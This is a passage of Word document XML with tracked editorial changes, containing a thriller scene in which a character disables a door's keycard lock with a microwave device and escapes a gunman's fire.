          <w:t>eclared</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Moshen. “Good news is you have an extra second or two. Bad news is, that’s because he’s reloading. Can you do something about his keycard?”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took a deep breath and </w:t>
      </w:r>
      <w:ins w:id="1074" w:author="TextVet" w:date="2016-03-17T14:34:00Z">
        <w:r w:rsidR="00744856">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>muttere</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1075" w:author="TextVet" w:date="2016-03-17T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00744856">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 xml:space="preserve">d, “I sure as hell hope so.” He put the end of his device </w:t>
      </w:r>
      <w:del w:id="1076" w:author="TextVet" w:date="2016-03-17T14:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002436C5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">against the wall, just under the button that would unlock the large metal stockroom door. The wall, he reckoned, was made of six inches’ worth of drywall, wood, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>and foam insulation — all of which was almost completely transparent to microwaves. He listened for movement on the other side.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1077" w:author="TextVet" w:date="2016-03-17T14:35:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Now!”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> yelled Moshen.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pulled the trigger. Current discharged from the capacitor bank to the magnetron, sending a soft</w:t>
      </w:r>
      <w:ins w:id="1078" w:author="TextVet" w:date="2016-03-17T14:36:00Z">
        <w:r w:rsidR="00C904C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low-pitched “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bonk!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” through the air around it. Lights flipped from green to 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other side of the wall, Danny heard a snapping sound, followed by a man screaming in shocked frustration and unleashing a long stream of Russian curse words. The man pulled in vain at the door handle on the other side. The door shook slightly but refused to yield.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held his device triumphantly over his shoulder. Its fans whirred to cool it from its recent shot. The capacitor bank began to recharge, emitting its characteristic rising whine.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round shadow eclipsed the </w:t>
      </w:r>
      <w:ins w:id="1079" w:author="TextVet" w:date="2016-03-17T14:37:00Z">
        <w:r w:rsidR="00EF3BB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>jaundiced</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1080" w:author="TextVet" w:date="2016-03-17T14:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF3BB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sickly yellow</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> glow of the small window embedded in the door. In the dim light, Danny could just </w:t>
      </w:r>
      <w:del w:id="1081" w:author="TextVet" w:date="2016-03-17T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001111C7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">barely </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">make out the man’s face, </w:t>
      </w:r>
      <w:ins w:id="1082" w:author="TextVet" w:date="2016-03-17T14:38:00Z">
        <w:r w:rsidR="00E254B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>glaring</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1083" w:author="TextVet" w:date="2016-03-17T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E254B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looking</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1084" w:author="TextVet" w:date="2016-03-17T14:38:00Z">
        <w:r w:rsidR="00E254B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">murderously </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>at him through the glass</w:t>
      </w:r>
      <w:del w:id="1085" w:author="TextVet" w:date="2016-03-17T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E254B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with eyes of fury</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The man’s cursing fell silent. He simply stared at Danny in impotent rage.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gave </w:t>
      </w:r>
      <w:ins w:id="1086" w:author="TextVet" w:date="2016-03-17T14:39:00Z">
        <w:r w:rsidR="007070C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>him</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1087" w:author="TextVet" w:date="2016-03-17T14:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007070C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the man</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a smug shrug, waved goodbye, and turned around to saunter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had barely made it two steps when he heard a “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pop-clack!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”, coupled with the sound of shattering glass.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turned to look.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All that remained of the small square window was a few jagged shards. The man drew </w:t>
      </w:r>
      <w:commentRangeStart w:id="1088"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his gun up. The end of the silencer came to rest upon a crag of broken glass. The man looked down the sights and took aim.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1088"/>
      <w:r w:rsidR="004A77D8">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1088"/>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w:t>
      </w:r>
      <w:ins w:id="1089" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1090" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> felt the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> world </w:t>
      </w:r>
      <w:ins w:id="1091" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">began </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reced</w:t>
      </w:r>
      <w:ins w:id="1092" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1093" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00814F5D">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xml:space="preserve"> in slow motion</w:t>
      </w:r>
      <w:ins w:id="1094" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1095" w:author="TextVet" w:date="2016-03-17T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00814F5D">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096" w:author="TextVet" w:date="2016-03-17T14:42:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>as if</w:t>
        </w:r>
        <w:r w:rsidR="007C4214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> hosed by </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1097" w:author="TextVet" w:date="2016-03-17T14:43:00Z">
        <w:r w:rsidR="007C4214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1098" w:author="TextVet" w:date="2016-03-17T14:42:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> thundering</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1099" w:author="TextVet" w:date="2016-03-17T14:44:00Z">
        <w:r w:rsidR="007C4214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1100" w:author="TextVet" w:date="2016-03-17T14:43:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> icicled</w:t>
        </w:r>
        <w:r w:rsidR="000B23B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> bloo</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1101" w:author="TextVet" w:date="2016-03-17T14:44:00Z">
        <w:r w:rsidR="001C4C42">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">d </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1102" w:author="TextVet" w:date="2016-03-17T14:45:00Z">
        <w:r w:rsidR="001C4C42">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>while</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1103" w:author="TextVet" w:date="2016-03-17T14:42:00Z">
        <w:r w:rsidR="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1104" w:author="TextVet" w:date="2016-03-17T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">The accelerating thump of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">his own pulse </w:t>
      </w:r>
      <w:del w:id="1105" w:author="TextVet" w:date="2016-03-17T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00814F5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>drowned out all other sound in his ears</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1106" w:author="TextVet" w:date="2016-03-17T14:44:00Z">
        <w:r w:rsidR="007C4214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>deafen</w:t>
        </w:r>
        <w:r w:rsidR="000B23B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
        <w:r w:rsidR="007C4214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> him</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propelled himself away from the door with all the power his legs could offer. He only needed to take seven or eight sprinting steps to make it to an intersection in the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>hallway, but in those steps he felt like he was frozen in mid-air. A bullet zinged past him — Danny saw nothing, but felt the air crack against his skin in the projectile’s wake. He twisted his torso to expose only his side to the gunfire. Another bullet zoomed by, so close he could feel its heat against his back, across his left shoulder blade.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adjoining corridor drew nearer. He leaped and rolled into the hallway, his weapon smacking against the floor as he pushed hi</w:t>
      </w:r>
      <w:ins w:id="1107" w:author="TextVet" w:date="2016-03-17T14:46:00Z">
        <w:r w:rsidR="00353BC2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>mself</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1108" w:author="TextVet" w:date="2016-03-17T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00353BC2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s body</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> away from the line of fire. A bullet </w:t>
      </w:r>
      <w:ins w:id="1109" w:author="TextVet" w:date="2016-03-17T14:46:00Z">
        <w:r w:rsidR="00B25F41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>smacked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1110" w:author="TextVet" w:date="2016-03-17T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B25F41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hit</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the floor near his feet. He took several crouching, stumbling steps deeper into the hallway as another bullet hit the wall near him, leaving a dusty crater.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looked around. He was out of the line of fire. From around the bend, he could hear the man trapped in the stockroom banging against the door and cursing in Russian. The bullets had stopped.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he was still in danger.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On the other end of the dark hallway into which he had just fled, Danny saw the shape of a large man. </w:t>
      </w:r>
      <w:ins w:id="1111" w:author="TextVet" w:date="2016-03-17T14:47:00Z">
        <w:r w:rsidR="00863FE5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>It</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1112" w:author="TextVet" w:date="2016-03-17T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00863FE5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>The shape</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:del w:id="1113" w:author="TextVet" w:date="2016-03-17T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00863FE5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>coming toward</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1114" w:author="TextVet" w:date="2016-03-17T14:47:00Z">
        <w:r w:rsidR="00863FE5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>approaching</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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pushed himself back up from the floor. His left shoulder stung under the strain.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grabbed his weapon. Most of the machine’s mass was at its back end, where its eight-pack of blue ultracapacitors was attached. Danny held it in both hands and raised it like a sledgehammer, ready to smash the capacitor bank across the face of his </w:t>
      </w:r>
      <w:del w:id="1115" w:author="TextVet" w:date="2016-03-17T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003618C6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">approaching </w:delText>
        </w:r>
      </w:del>
